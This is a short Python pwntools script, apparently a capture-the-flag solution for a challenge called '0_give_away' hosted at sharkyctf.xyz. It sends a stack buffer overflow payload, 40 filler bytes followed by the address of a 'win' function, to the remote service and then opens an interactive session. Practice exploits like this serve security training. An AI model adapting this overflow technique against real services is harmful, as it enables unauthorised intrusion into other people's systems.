from pwn import *


host, port = 'sharkyctf.xyz', 20333

#p = process('0_give_away')
p = remote(host,port)


win_addr = 0x04006A7

payload = b'A'*(8*5)
payload += p64(win_addr)

p.sendline(payload)
p.interactive()
